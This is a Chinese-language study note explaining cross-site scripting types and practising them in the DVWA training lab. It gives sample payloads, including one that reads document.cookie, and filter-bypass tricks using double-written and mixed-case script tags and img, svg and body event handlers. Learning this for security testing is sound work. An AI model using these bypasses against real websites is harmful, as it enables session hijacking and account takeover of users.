1.是一种web安全漏洞，允许攻击者破坏用户易受攻击的应用程序的交互。
跨站点脚本漏洞通常允许攻击者伪装成受害者用户，执行用户能够执行的任何操作，并访问用户的任何数据。如果受害用户在应用程序内具有特权访问权限，则攻击者可能能够完全控制应用程序的所有功能和数据。
跨站点脚本的工作原理是操纵易受攻击的网站，使其将恶意 JavaScript 返回给用户。当恶意代码在受害者的浏览器中执行时，攻击者可以完全破坏他们与应用程序的交互。
2.. **反射型XSS**：恶意脚本作为参数附加在URL中，服务器将其反射到响应页面。例如：`http://site.com/search?q=<script>alert(1)</script>`。测试方法：手动构造URL参数或使用Burp的“Reflector”工具。
**存储型XSS**：恶意脚本被永久存储在服务器（如数据库或评论区），当用户访问相关页面时触发。测试方法：在输入点（如留言板）提交`<script>alert(document.cookie)</script>`，检查是否被存储并执行。
**DOM型XSS**：漏洞存在于客户端JavaScript代码中，通过修改DOM环境触发。例如：URL片段（如`#<script>alert(1)</script>`）被JavaScript读取并写入页面。测试方法：检查JavaScript代码中是否存在`document.write`、`innerHTML`等危险操作。
### #xss在dvwa中的实战
1.xss reflected
http://dvwa.test/security.php
在低模式下，直接在搜索框中输入js代码就好了
在中模式下：
	1.双写绕过：<sc<script>ript>alert('xss')</script>
	2.大小写绕过：<ScRipt>alert('XSS')</script>
	 3.使用<img>标签:<img src=x onerror=alert('xss')

在高模式下：
这个模式要彻底放弃使用<script>标签

1.使用<img>标签:<img src=x onerror=alert('XSS')>
2.使用<svg>标签：<svg onload=alert('XSS')>
3.使用<boby>标签：<body onload=alert('XSS')>
			 